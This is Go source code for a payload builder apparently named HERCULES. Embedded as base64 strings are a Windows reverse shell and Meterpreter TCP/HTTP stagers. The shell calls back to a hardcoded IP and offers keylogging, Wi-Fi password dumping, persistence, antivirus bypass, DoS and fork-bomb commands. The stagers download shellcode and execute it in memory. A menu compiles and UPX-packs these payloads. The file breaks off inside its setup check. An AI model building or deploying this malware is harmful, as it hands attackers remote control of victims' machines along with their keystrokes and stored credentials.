package main


import "strings"
import "fmt"
import "os"
import "time"
import "strconv"
import "net/http"
import "io/ioutil"
import "os/exec"
import "encoding/base64"
import "color"


const VERSION string = "3.0.5"

var HERCULES_REVERSE_SHELL string = "cGFja2FnZSBtYWluCgppbXBvcnQgIm5ldCIKaW1wb3J0ICJvcy9leGVjIgppbXBvcnQgImJ1ZmlvIgppbXBvcnQgInN0cmluZ3MiCmltcG9ydCAic3lzY2FsbCIKaW1wb3J0ICJ0aW1lIgppbXBvcnQgIkVHRVNQTE9JVCIKCgoKY29uc3QgSVAgc3RyaW5nID0gIjEwLjEwLjEwLjg0Igpjb25zdCBQT1JUIHN0cmluZyA9ICI1NTU1IgoKCmNvbnN0IEJZUEFTUyBib29sID0gZmFsc2U7CmNvbnN0IEJBQ0tET09SIGJvb2wgPSBmYWxzZTsKY29uc3QgRU1CRURERUQgYm9vbCA9IGZhbHNlOwpjb25zdCBUSU1FX0RFTEFZIHRpbWUuRHVyYXRpb24gPSA1Oy8vU2Vjb25kCgpjb25zdCBCNjRfQklOQVJZIHN0cmluZyA9ICIvL0lOU0VSVC1CSU5BUlktSEVSRS8vIgpjb25zdCBCSU5BUllfTkFNRSBzdHJpbmcgPSAid2ludXBkdC5leGUiCgp2YXIgR0xPQkFMX0NPTU1BTkQgc3RyaW5nOwp2YXIgUEFSQU1FVEVSUyBzdHJpbmc7CnZhciBLZXlMb2dzIHN0cmluZzsKCgoKZnVuYyBtYWluKCkgewoKICBpZiBCWVBBU1MgPT0gdHJ1ZSB7CiAgICBFR0VTUExPSVQuQnlwYXNzQVYoMykKICB9CgoKICBpZiBFTUJFRERFRCA9PSB0cnVlIHsKICAgIEVHRVNQTE9JVC5EaXNwYXRjaChCNjRfQklOQVJZLCBCSU5BUllfTkFNRSwgUEFSQU1FVEVSUykKICB9CgoKICBpZiBCQUNLRE9PUiA9PSB0cnVlIHsKICAgIEVHRVNQTE9JVC5QZXJzaXN0ZW5jZSgpCiAgfQoKCiAgY29ubmVjdCwgZXJyIDo9IG5ldC5EaWFsKCJ0Y3AiLCBJUCsiOiIrUE9SVCk7CiAgaWYgZXJyICE9IG5pbCB7CiAgICB0aW1lLlNsZWVwKFRJTUVfREVMQVkqdGltZS5TZWNvbmQpOwogICAgbWFpbigpOwogIH07CgoKCiAgRGlyLCBWZXJzaW9uLCBVc2VybmFtZSwgQVYgOj0gRUdFU1BMT0lULlN5c2d1aWRlKCkKICBTeXNHdWlkZSA6PSAoQkFOTkVSICsgIiMgU1lTR1VJREVcbiIgKyAifCIgKyBzdHJpbmcoVmVyc2lvbikgKyAifFxufFxufj4gVXNlciA6ICIgKyBzdHJpbmcoVXNlcm5hbWUpICsgIlxufFxufFxufj4gQVYgOiAiICsgc3RyaW5nKEFWKSAgKyAiXG5cblxuIiArIHN0cmluZyhEaXIpICsgIj4iKQogIGNvbm5lY3QuV3JpdGUoW11ieXRlKHN0cmluZyhTeXNHdWlkZSkpKTsKCgoKICBmb3IgewoKICAgIENvbW1hbmQsIF8gOj0gYnVmaW8uTmV3UmVhZGVyKGNvbm5lY3QpLlJlYWRTdHJpbmcoJ1xuJyk7CiAgICBfQ29tbWFuZCA6PSBzdHJpbmcoQ29tbWFuZCk7CiAgICBHTE9CQUxfQ09NTUFORCA9IF9Db21tYW5kOwoKCgogICAgaWYgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIn5wbGVhc2UiKSB8fCBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAiflBMRUFTRSIpIHsKICAgICAgY29ubmVjdC5Xcml0ZShbXWJ5dGUoRUdFU1BMT0lULlBsZWFzZShHTE9CQUxfQ09NTUFORCkpKTsKICAgIH1lbHNlIGlmIHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+TUVURVJQUkVURVIiKSB8fCBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAifm1ldGVycHJldGVyIikgewogICAgICBUZW1wX0FkZHJlc3MgOj0gc3RyaW5ncy5TcGxpdChfQ29tbWFuZCwgIlwiIikvL35tZXRlcnByZXRlciAtLXRjcCAiMTI3LjAuMC4xOjQ0NDQiCiAgICAgIEFkZHJlc3MgOj0gc3RyaW5nKFRlbXBfQWRkcmVzc1sxXSkKICAgICAgQ29uVHlwZSA6PSBzdHJpbmdzLlNwbGl0KF9Db21tYW5kLCAiICIpCiAgICAgIENvblR5cGVbMV0gPSBzdHJpbmdzLlRyaW1QcmVmaXgoQ29uVHlwZVsxXSwgIi0tIikKICAgICAgRUdFU1BMT0lULk1ldGVycHJldGVyKENvblR5cGVbMV0sIEFkZHJlc3MpCiAgICAgIGNvbm5lY3QuV3JpdGUoW11ieXRlKCJcblxuWytdIE1ldGVycHJldGVyIEV4ZWN1dGVkICFcblxuIitEaXIrIj4iKSk7CiAgICB9ZWxzZSBpZiBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAifk1JR1JBVEUiKSB8fCBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAifm1pZ3JhdGUiKSB7CiAgICAgIFRlbXBfQWRkcmVzcyA6PSBzdHJpbmdzLlNwbGl0KF9Db21tYW5kLCAiXCIiKS8vfm1pZ3JhdGUgIjEyNy4wLjAuMTo0NDQ0IiAxMjEyCiAgICAgIEFkZHJlc3MgOj0gc3RyaW5nKFRlbXBfQWRkcmVzc1sxXSkKICAgICAgUGlkIDo9IHN0cmluZ3MuU3BsaXQoX0NvbW1hbmQsICIgIikKICAgICAgUmVzdWx0LCBFcnJvciA6PSBFR0VTUExPSVQuTWlncmF0ZShQaWRbMl0sIEFkZHJlc3MpCiAgICAgIGlmIFJlc3VsdCA9PSB0cnVlIHsKICAgICAgICAgIGNvbm5lY3QuV3JpdGUoW11ieXRlKCJcblxuWytdIFN1Y2Nlc2Z1bGx5IE1pZ3JhdGVkICFcblxuIitEaXIrIj4iKSk7CiAgICAgIH1lbHNlewogICAgICAgIGNvbm5lY3QuV3JpdGUoW11ieXRlKCJcblxuIitFcnJvcisiXG5cbiIrRGlyKyI+IikpOwogICAgICB9CiAgICB9ZWxzZSBpZiBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAifkRPUyIpIHx8IHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+ZG9zIikgewogICAgICBET1NfQ29tbWFuZCA6PSBzdHJpbmdzLlNwbGl0KEdMT0JBTF9DT01NQU5ELCAiXCIiKQogICAgICB2YXIgRE9TX1RhcmdldCBzdHJpbmcgPSAgRE9TX0NvbW1hbmRbMV0KICAgICAgaWYgc3RyaW5ncy5Db250YWlucyhzdHJpbmcoRE9TX1RhcmdldCksICJodHRwIikgewogICAgICAgIGdvIEVHRVNQTE9JVC5Eb3MoRE9TX1RhcmdldCk7CiAgICAgICAgY29ubmVjdC5Xcml0ZShbXWJ5dGUoIlxuXG5bKl0gU3RhcnRpbmcgRE9TIGF0YWNrLi4uIisiXG5cblsqXSBTZW5kaW5nIDEwMDAgcmVxdWVzdCB0byAiK0RPU19UYXJnZXQrIiAhXG5cbiIrRGlyKyI+IikpOwogICAgICB9ZWxzZXsKICAgICAgICBjb25uZWN0LldyaXRlKFtdYnl0ZSgiXG5cblstXSBFUlJPUjogSW52YWxpZCB1cmwgIVxuXG4iK0RpcisiPiIpKTsKICAgICAgfQogICAgfWVsc2UgaWYgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIn5ESVNUUkFDVCIpIHx8IHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+ZGlzdHJhY3QiKSB7CiAgICAgIEVHRVNQTE9JVC5EaXN0cmFja3QoKTsKICAgIH1lbHNlIGlmIHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+S0VZTE9HR0VSLURFUExPWSIpIHx8IHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+a2V5bG9nZ2VyLWRlcGxveSIpIHx8IHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+S2V5bG9nZ2VyLURlcGxveSIpewogICAgICBnbyBFR0VTUExPSVQuS2V5bG9nZ2VyKCZLZXlMb2dzKTsKICAgICAgIGNvbm5lY3QuV3JpdGUoW11ieXRlKHN0cmluZygiXG5bKl0gS2V5bG9nZ2VyIGRlcGxveSBjb21wbGV0ZWRcbiIgKyAiXG4iICsgc3RyaW5nKERpcikgKyAiPiIpKSk7CiAgICB9ZWxzZSBpZiBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAifktFWUxPR0dFUi1EVU1QIikgfHwgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIn5rZXlsb2dnZXItZHVtcCIpIHx8IHN0cmluZ3MuQ29udGFpbnMoX0NvbW1hbmQsICJ+S2V5bG9nZ2VyLUR1bXAiKXsKICAgICAgRHVtcF9PdXRwdXQgOj0gc3RyaW5nKCIjIyMjIyMjIyMjIyMjIyMjIyMgS0VZTE9HR0VSIERVTVAgIyMjIyMjIyMjIyMjIyMjIyMjIiArICJcblxuIiArIHN0cmluZyhLZXlMb2dzKSArICJcbiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMiICsgIlxuIitzdHJpbmcoRGlyKSsiPiIpOwogICAgICBjb25uZWN0LldyaXRlKFtdYnl0ZShEdW1wX091dHB1dCkpOwogICAgfWVsc2UgaWYgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIn5XSUZJLUxJU1QiKSB8fCBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAifndpZmktbGlzdCIpIHsKICAgICAgTGlzdCA6PSBFR0VTUExPSVQuV2lmaUxpc3QoKTsKICAgICAgY29ubmVjdC5Xcml0ZShbXWJ5dGUoc3RyaW5nKExpc3QpKSk7CiAgICB9ZWxzZSBpZiBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAifkhFTFAiKSB8fCBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAifmhlbHAiKSB7CiAgICAgIGNvbm5lY3QuV3JpdGUoW11ieXRlKHN0cmluZyhIRUxQK0RpcisiPiIpKSk7CiAgICB9ZWxzZSBpZiBzdHJpbmdzLkNvbnRhaW5zKF9Db21tYW5kLCAiflBFUlNJU1RFTkNFIikgfHwgc3RyaW5ncy5Db250YWlucyhfQ29tbWFuZCwgIn5wZXJzaXN0ZW5jZSIpIHsKICAgICAgZ28gRUdFU1BMT0lULlBlcnNpc3RlbmNlKCk7CiAgICAgIGNvbm5lY3QuV3JpdGUoW11ieXRlKCJcblxuWypdIEFkZGluZyBwZXJzaXN0ZW5jZSByZWdpc3RyaWVzLi4uXG5bKl0gUGVyc2lzdGVuY2UgQ29tcGxldGVkXG5cbiIgKyBzdHJpbmcoRGlyKSArIj4iKSk7CiAgICB9ZWxzZXsKICAgICAgY21kIDo9IGV4ZWMuQ29tbWFuZCgiY21kIiwgIi9DIiwgX0NvbW1hbmQpOwogICAgICBjbWQuU3lzUHJvY0F0dHIgPSAmc3lzY2FsbC5TeXNQcm9jQXR0cntIaWRlV2luZG93OiB0cnVlfTsKICAgICAgb3V0LCBfIDo9IGNtZC5PdXRwdXQoKTsKICAgICAgQ29tbWFuZF9PdXRwdXQgOj0gc3RyaW5nKCJcblxuIitzdHJpbmcob3V0KSsiXG4iK3N0cmluZyhEaXIpKyI+Iik7CiAgICAgIGNvbm5lY3QuV3JpdGUoW11ieXRlKENvbW1hbmRfT3V0cHV0KSk7CiAgICB9OwogIH07Cn07CgoKCgoKCnZhciBCQU5ORVIgc3RyaW5nID0gYAogICAgICAgICAgICAgICAgICBfXyAgX19fX19fX19fX19fICBfX19fX19fXyAgX19fXyAgICBfX19fX19fX19fXwogICAgICAgICAgICAgICAgIC8gLyAvIC8gX19fXy8gX18gXC8gX19fXy8gLyAvIC8gLyAgIC8gX19fXy8gX19fLwogICAgICAgICAgICAgICAgLyAvXy8gLyBfXy8gLyAvXy8gLyAvICAgLyAvIC8gLyAvICAgLyBfXy8gIFxfXyBcCiAgICAgICAgICAgICAgIC8gX18gIC8gL19fXy8gXywgXy8gL19fXy8gL18vIC8gL19fXy8gL19fXyBfX18vIC8KICAgICAgICAgICAgICAvXy8gL18vX19fX18vXy8gfF98XF9fX18vXF9fX18vX19fX18vX19fX18vL19fX18vCgoKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyBIRVJDVUxFUyBSRVZFUlNFIFNIRUxMICMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKYAoKCgoKdmFyIEhFTFAgc3RyaW5nID0gYAoKICAgICAgICAgICAgICAgICAgX18gIF9fX19fX19fX19fXyAgX19fX19fX18gIF9fX18gICAgX19fX19fX19fX18KICAgICAgICAgICAgICAgICAvIC8gLyAvIF9fX18vIF9fIFwvIF9fX18vIC8gLyAvIC8gICAvIF9fX18vIF9fXy8KICAgICAgICAgICAgICAgIC8gL18vIC8gX18vIC8gL18vIC8gLyAgIC8gLyAvIC8gLyAgIC8gX18vICBcX18gXAogICAgICAgICAgICAgICAvIF9fICAvIC9fX18vIF8sIF8vIC9fX18vIC9fLyAvIC9fX18vIC9fX18gX19fLyAvCiAgICAgICAgICAgICAgL18vIC9fL19fX19fL18vIHxffFxfX19fL1xfX19fL19fX19fL19fX19fLy9fX19fLwoKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMgSEVSQ1VMRVMgUkVWRVJTRSBTSEVMTCAjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKCgoKflBFUlNTSVNURU5DRSAgICAgICAgICAgICAgICAgICAgICAgICBJbnN0YWxscyBhIHBlcnNpc3RlbmNlIG1vZHVsZSBmb3IgY29udGluaW91cyBhY2NlcwoKfkRJU1RSQUNUICAgICAgICAgICAgICAgICAgICAgICAgICAgICBFeGVjdXRlcyBhIGZvcmsgYm9tYiBiYXQgZmlsZSBmb3IgZGlzdHJhY3Rpb24KCn5QTEVBU0UgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQXNrcyB1c2VycyBjb21maXJtYXRpb24gZm9yIGhpZ2hlciBwcml2aWxpZGdlIG9wZXJhdGlvbnMKCn5ET1MgLUEgInd3dy50YXJnZXRzaXRlLmNvbSIgICAgICAgICAgU3RhcnRzIGEgZGVuaWFsIG9mIHNlcnZpY2UgYXRhY2sKCn5XSUZJLUxJU1QgCQkJCQkJICAgICAgICAgICAgICAgIER1bXBzIGFsbCB3aWZpIGhpc3RvcnkgZGF0YSB3aXRoIHBhc3N3b3JkcwoKfk1FVEVSUFJFVEVSIC0taHR0cCAiMTAuMC4wLjE6NDQ0NCIgICBDcmVhdGVzIGEgbWV0ZXJwcmV0ZXIgY29ubmVjdGlvbiB0byBtZXRhc3Bsb2l0IChodHRwL2h0dHBzL3RjcCkKCn5LRVlMT0dHRVItREVQTE9ZICAgICAgICAgICAgICAgICAgICAgSW5zdGFsbHMgYSBrZXlsb2dnZXIgbW9kdWxlIGFuZCBsb2dzIGFsbCBrZXlzdHJva2VzCgp+S0VZTE9HR0VSLURVTVAgICAgICAgICAgICAgICAgICAgICAgIER1bXBzIGFsbCBsb2dlZCBrZXlzdHJva2VzCgp+TUlHUkFURSAiMTAuMC4wLjE6NDQ0NCIgMjIyMiAgICAgICAgIENyZWF0ZXMgYSByZXZlcnNlIGh0dHAgbWV0ZXJwcmV0ZXIgc2Vzc2lvbiBhdCBnaXZlbiBwaWQgKEVYUEVSSU1FTlRBTCkKCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwoKYAo="
var METERPRETER_TCP string = "cGFja2FnZSBtYWluCgoKaW1wb3J0ICJlbmNvZGluZy9iaW5hcnkiCmltcG9ydCAic3lzY2FsbCIKaW1wb3J0ICJ1bnNhZmUiCi8vaW1wb3J0ICJFR0VTUExPSVQvUlNFIgoKY29uc3QgTUVNX0NPTU1JVCAgPSAweDEwMDAKY29uc3QgTUVNX1JFU0VSVkUgPSAweDIwMDAKY29uc3QgUEFHRV9BbGxvY2F0ZVVURV9SRUFEV1JJVEUgID0gMHg0MAoKCmZ1bmMgRGVPYmZ1c2NhdGUoRGF0YSBzdHJpbmcpIChzdHJpbmcpewoJLy9SU0UuQnlwYXNzQVYoMykKCXZhciBDbGVhclRleHQgc3RyaW5nCglmb3IgaSA6PSAwOyBpIDwgbGVuKERhdGEpOyBpKysgewoJCUNsZWFyVGV4dCArPSBzdHJpbmcoaW50KERhdGFbaV0pLTEpCgl9CglyZXR1cm4gQ2xlYXJUZXh0Cn0KCgoKdmFyCUszMiA9IHN5c2NhbGwuTXVzdExvYWRETEwoRGVPYmZ1c2NhdGUoImxmc29mbTQzL2VtbSIpKS8va2VybmVsMzIuZGxsCnZhciBWaXJ0dWFsQWxsb2MgPSBLMzIuTXVzdEZpbmRQcm9jKERlT2JmdXNjYXRlKCJXanN1dmJrQm1tb2QiKSkvL1ZpcnR1YWxBbGxvYwoKCmZ1bmMgQWxsb2NhdGUoU2hlbGxjb2RlIHVpbnRwdHIpICh1aW50cHRyKSB7CgoJQWRkciwgXywgXyA6PSBWaXJ0dWFsQWxsb2MuQ2FsbCgwLCBTaGVsbGNvZGUsIE1FTV9SRVNFUlZFfE1FTV9DT01NSVQsIFBBR0VfQWxsb2NhdGVVVEVfUkVBRFdSSVRFKQoJaWYgQWRkciA9PSAwIHsKCQltYWluKCkKCX0KCXJldHVybiBBZGRyCn0KCmZ1bmMgbWFpbigpIHsKCS8vUlNFLlBlcnNpc3RlbmNlKCkKCXZhciBXU0FfRGF0YSBzeXNjYWxsLldTQURhdGEKCXN5c2NhbGwuV1NBU3RhcnR1cCh1aW50MzIoMHgyMDIpLCAmV1NBX0RhdGEpCglTb2NrZXQsIF8gOj0gc3lzY2FsbC5Tb2NrZXQoc3lzY2FsbC5BRl9JTkVULCBzeXNjYWxsLlNPQ0tfU1RSRUFNLCAwKQoJU29ja2V0X0FkZHIgOj0gc3lzY2FsbC5Tb2NrYWRkckluZXQ0e1BvcnQ6IDU1NTUsIEFkZHI6IFs0XWJ5dGV7MTI3LDAsMCwxfX0KCXN5c2NhbGwuQ29ubmVjdChTb2NrZXQsICZTb2NrZXRfQWRkcikKCXZhciBMZW5ndGggWzRdYnl0ZQoJV1NBX0J1ZmZlciA6PSBzeXNjYWxsLldTQUJ1ZntMZW46IHVpbnQzMig0KSwgQnVmOiAmTGVuZ3RoWzBdfQoJVWl0blplcm9fMSA6PSB1aW50MzIoMCkKCURhdGFSZWNlaXZlZCA6PSB1aW50MzIoMCkKCXN5c2NhbGwuV1NBUmVjdihTb2NrZXQsICZXU0FfQnVmZmVyLCAxLCAmRGF0YVJlY2VpdmVkLCAmVWl0blplcm9fMSwgbmlsLCBuaWwpCglMZW5ndGhfaW50IDo9IGJpbmFyeS5MaXR0bGVFbmRpYW4uVWludDMyKExlbmd0aFs6XSkKCWlmIExlbmd0aF9pbnQgPCAxMDAgewoJCW1haW4oKQoJfQoJU2hlbGxjb2RlX0J1ZmZlciA6PSBtYWtlKFtdYnl0ZSwgTGVuZ3RoX2ludCkKCgl2YXIgU2hlbGxjb2RlIFtdYnl0ZQoJV1NBX0J1ZmZlciA9IHN5c2NhbGwuV1NBQnVme0xlbjogTGVuZ3RoX2ludCwgQnVmOiAmU2hlbGxjb2RlX0J1ZmZlclswXX0KCVVpdG5aZXJvXzEgPSB1aW50MzIoMCkKCURhdGFSZWNlaXZlZCA9IHVpbnQzMigwKQoJVG90YWxEYXRhUmVjZWl2ZWQgOj0gdWludDMyKDApCglmb3IgVG90YWxEYXRhUmVjZWl2ZWQgPCBMZW5ndGhfaW50IHsKCQlzeXNjYWxsLldTQVJlY3YoU29ja2V0LCAmV1NBX0J1ZmZlciwgMSwgJkRhdGFSZWNlaXZlZCwgJlVpdG5aZXJvXzEsIG5pbCwgbmlsKQoJCWZvciBpIDo9IDA7IGkgPCBpbnQoRGF0YVJlY2VpdmVkKTsgaSsrIHsKCQkJU2hlbGxjb2RlID0gYXBwZW5kKFNoZWxsY29kZSwgU2hlbGxjb2RlX0J1ZmZlcltpXSkKCQl9CgkJVG90YWxEYXRhUmVjZWl2ZWQgKz0gRGF0YVJlY2VpdmVkCgl9CgoJQWRkciA6PSBBbGxvY2F0ZSh1aW50cHRyKExlbmd0aF9pbnQgKyA1KSkKCUFkZHJQdHIgOj0gKCpbOTkwMDAwXWJ5dGUpKHVuc2FmZS5Qb2ludGVyKEFkZHIpKQoJU29ja2V0UHRyIDo9ICh1aW50cHRyKSh1bnNhZmUuUG9pbnRlcihTb2NrZXQpKQoJQWRkclB0clswXSA9IDB4QkYKCUFkZHJQdHJbMV0gPSBieXRlKFNvY2tldFB0cikKCUFkZHJQdHJbMl0gPSAweDAwCglBZGRyUHRyWzNdID0gMHgwMAoJQWRkclB0cls0XSA9IDB4MDAKCWZvciBCcHVBS3JKeGZsLCBJSW5nYWNNYUJoIDo9IHJhbmdlIFNoZWxsY29kZSB7CgkJQWRkclB0cltCcHVBS3JKeGZsKzVdID0gSUluZ2FjTWFCaAoJfQoJLy9SU0UuTWlncmF0ZShBZGRyLCBpbnQoTGVuZ3RoX2ludCkpCglzeXNjYWxsLlN5c2NhbGwoQWRkciwgMCwgMCwgMCwgMCkKfQoKLyoKCjEuIENyZWF0ZSBXU0EgREFUQSB2ZXJzaW9uIDIuMgoyLiBDcmVhdGUgYSBXU0EgU29ja2V0CjMuIENyZWF0ZSBXU0EgU29ja2V0IEFkZHJlc3Mgb2JqZWN0CjQuIENvbm5lY3QKNS4gQ3JlYXRlIDQgYnl0ZSBzZWNvbmQgc3RhZ2UgbGVuZ3RoIGFycmF5CjYuIENyZWF0ZSBhIFdTQSBCdWZmZXIgb2JqZWN0IHBvaW50aW5nIHNlY29uZCBzdGFnZSBsZW5ndGggYXJyYXkKNy4gUmVjZWl2ZSA0IGJ5dGVzIFdTQVJlY3YgdG8gc2Vjb25kIHN0YWdlIGxlbmd0aCBhcnJheQo4LiBDb252ZXJ0IHNlY29uZCBzdGFnZSBsZW5ndGggdG8gaW50CjkuIENyZWF0ZSBhIGJ5dGUgYXJyYXkgYXQgdGhlIHNpemUgb2Ygc2Vjb25kIHN0YWdlIGJ5dGUgYXJyYXkgZm9yIHNlY29uZCBzdGFnZSBzaGVsbGNvZGUKMTAuIENyZWF0ZSBhIHVuZGVmaW5lZCBieXRlIGFycmF5CjExLiBDcmVhdGUgYW5vdGhlciBXU0EgYnVmZmVyIG9iamVjdCBwb2ludGluZyBhdCBzZWNvbmQgc3RhZ2Ugc2hlbGxjb2RlIGJ5dGUgYXJyYXkKMTIuIENvbnN0cnVjdCBhIG5lc3RlZCBmb3IgbG9vcCB0aGF0IHJlY2VpdmVzIGJ5dGVzIGFuZCBhcHBlbmRzIHRoZW0gaW50byB1bmRlZmluZWQgYnl0ZSBhcnJheQoxMy4gQWxsb2NhdGUgc3BhY2UgaW4gbWVtb3J5IGF0IHRoZSBzaXplIG9mIChzZWNvbmQgc3RhZ2Ugc2hlbGxjb2RlICsgNSkKMTQuIENyZWF0ZSBhIHBvaW50ZXIgdGhhdCBwb2ludHMgdG8gV1NBIFNvY2tldAoxNS4gQXNzaW5nIDB4QkYobW92IGVkaSkgdG8gZmlzdCBieXRlIG9mIGFsbG9jYXRlZCBtZW1vcnkKMTYuIEFzc2luZyBXU0EgU29ja2V0IHBvaW50ZXIgdG8gc2Vjb25kIGJ5dGUgb2YgYWxsb2NhdGVkIG1lbW9yeQoxNy4gQXNzaW5nIHRyZWUgbnVsbCBieXRlcyBhZnRlciBzZWNvbmQgYnl0ZSBvZiBhbGxvY2F0ZWQgbWVtb3J5CjE4LiBNb3ZlIHNoZWxsY29kZSBieXRlcyB0byBhbGxvY2F0ZWQgbWVtb3J5IHN0YXJ0aW5nIGF0IGZpZnQgYnl0ZQoxOS4gTWFrZSBhIHN5c2NhbGwgdG8gYWxsb2NhdGVkIG1lbW9yeSBhZGRyZXNzCiovCg=="
var METERPRETER_HTTP_HTTPS string = "cGFja2FnZSBtYWluCgppbXBvcnQgIm5ldC9odHRwIgppbXBvcnQgInN5c2NhbGwiCmltcG9ydCAidW5zYWZlIgppbXBvcnQgImlvL2lvdXRpbCIKLy9pbXBvcnQgIkVHRVNQTE9JVC9SU0UiCgoKCmNvbnN0IE1FTV9DT01NSVQgID0gMHgxMDAwCmNvbnN0IE1FTV9SRVNFUlZFID0gMHgyMDAwCmNvbnN0IFBBR0VfQWxsb2NhdGVVVEVfUkVBRFdSSVRFICA9IDB4NDAKCgoKCmZ1bmMgRGVPYmZ1c2NhdGUoRGF0YSBzdHJpbmcpIChzdHJpbmcpewogIC8vUlNFLkJ5cGFzc0FWKDMpCiAgdmFyIENsZWFyVGV4dCBzdHJpbmcKICBmb3IgaSA6PSAwOyBpIDwgbGVuKERhdGEpOyBpKysgewogICAgQ2xlYXJUZXh0ICs9IHN0cmluZyhpbnQoRGF0YVtpXSktMSkKICB9CiAgcmV0dXJuIENsZWFyVGV4dAp9CgoKCnZhciBLMzIgPSBzeXNjYWxsLk11c3RMb2FkRExMKERlT2JmdXNjYXRlKCJsZnNvZm00My9lbW0iKSkvL2tlcm5lbDMyLmRsbAp2YXIgVmlydHVhbEFsbG9jID0gSzMyLk11c3RGaW5kUHJvYyhEZU9iZnVzY2F0ZSgiV2pzdXZia0JtbW9kIikpLy9WaXJ0dWFsQWxsb2MKCnZhciBBZGRyZXNzIHN0cmluZyA9ICJodHRwOi8vMTI3LjAuMC4xOjgwODAvIgp2YXIgQ2hlY2tzdW0gc3RyaW5nID0gIjEwMjAxMWI3dHhwbDcxbiIKCgoKZnVuYyBtYWluKCkgewoKICAgIC8vUlNFLkJ5cGFzc0FWKDMpCiAgCS8vUlNFLlBlcnNpc3RlbmNlKCkKICAJQWRkcmVzcyArPSBDaGVja3N1bQogIAlSZXNwb25zZSwgZXJyIDo9IGh0dHAuR2V0KEFkZHJlc3MpCiAgCWlmIGVyciAhPSBuaWwgewogICAgCW1haW4oKQogIAl9CiAgCVNoZWxsY29kZSwgXyA6PSBpb3V0aWwuUmVhZEFsbChSZXNwb25zZS5Cb2R5KQoKICAJQWRkciwgXywgZXJyIDo9IFZpcnR1YWxBbGxvYy5DYWxsKDAsIHVpbnRwdHIobGVuKFNoZWxsY29kZSkpLCBNRU1fUkVTRVJWRXxNRU1fQ09NTUlULCBQQUdFX0FsbG9jYXRlVVRFX1JFQURXUklURSkKICAJaWYgQWRkciA9PSAwIHsKICAgIAltYWluKCkKICAJfQogIAlBZGRyUHRyIDo9ICgqWzk5MDAwMF1ieXRlKSh1bnNhZmUuUG9pbnRlcihBZGRyKSkKICAJZm9yIGkgOj0gMDsgaSA8IGxlbihTaGVsbGNvZGUpOyBpKysgewogICAgCUFkZHJQdHJbaV0gPSBTaGVsbGNvZGVbaV0KICAJfQogIAkvL1JTRS5NaWdyYXRlKEFkZHIsIGxlbihTaGVsbGNvZGUpKQogIAlzeXNjYWxsLlN5c2NhbGwoQWRkciwgMCwgMCwgMCwgMCkKCn0K"

type PAYLOAD struct {
  Ip string
  Port string
  Type int
  Size string
  UPX_Size string
  MidSize string
  FullSize string
  Score float32
  FileName string
  SourceCode string
  Persistence bool
  Migrate bool
  BypassAV bool
  UPX bool

}

var Payload PAYLOAD
var MenuSelection int
var Ask string
var NO int



func main() {

  Green := color.New(color.FgGreen)
  BoldGreen := Green.Add(color.Bold)
  Yellow := color.New(color.FgYellow)
  BoldYellow := Yellow.Add(color.Bold)
  Red := color.New(color.FgRed)
  BoldRed := Red.Add(color.Bold)


  Result := CheckSetup()

  if Result == false {
    ClearScreen()
    PrintBanner()
    PrintCredit()

    BoldRed.Println("\n\n[!] HERCULES is not installed properly, please run setup.sh")

    os.Exit(1)

  }

  ClearScreen()
  PrintBanner()
  PrintCredit()
  Menu_1()

  fmt.Scan(&MenuSelection)

  ClearScreen()

  if MenuSelection == 1 {
    PrintBanner()
    PrintPayloads()
    fmt.Print("\n\n[*] Select : ")
    fmt.Scan(&NO)
    PreparePayload(NO)

    fmt.Print("\n\n[*] Enter the base name for output files : ")
    fmt.Scan(&Payload.FileName)
    CompilePayload()
    AskUPX()
    FinalView()
  }else if MenuSelection == 2 {
    ClearScreen()
    PrintBanner()
    PrintCredit()
    BoldRed.Println("\n\n[!] Bind payload option will be added at next version...")
    time.Sleep(3*time.Second)
    main()
  }else if MenuSelection == 3 {
    ClearScreen()
    PrintBanner()
    PrintCredit()
    fmt.Println("\n\n")
    Result := ChecVersion()
    if strings.Contains(Result, "[!]") {
      BoldRed.Println(Result)
      if Result == "[!] New version detected" {
        BoldYellow.Print("\nDo you want to upgrade ? (y/n) : ")
        fmt.Scan(&Ask)
        if Ask == "y" || Ask == "Y" {
          Update := exec.Command("sh", "-c", "chmod 777 Update && sudo ./Update")
          Update.Stdout = os.Stdout
          Update.Stderr = os.Stderr
          Update.Start()
        }else{
          main()
        }
      }
    }else{
      BoldGreen.Println(Result)
      time.Sleep(3*time.Second)
      main()
    }
  }else{
    main()
  }


}

func CheckSetup()  (bool){

  DirList, _ := exec.Command("sh", "-c", "cd /usr/lib/go-1.6/src && ls").Output()
  DirList2, _ := exec.Command("sh", "-c", "cd /usr/lib/go/src && ls").Output()
  GoVer, _ := exec.Command("sh", "-c", "go version").Output()
  UPX, _ := exec.Command("sh", "-c", "upx").Output()

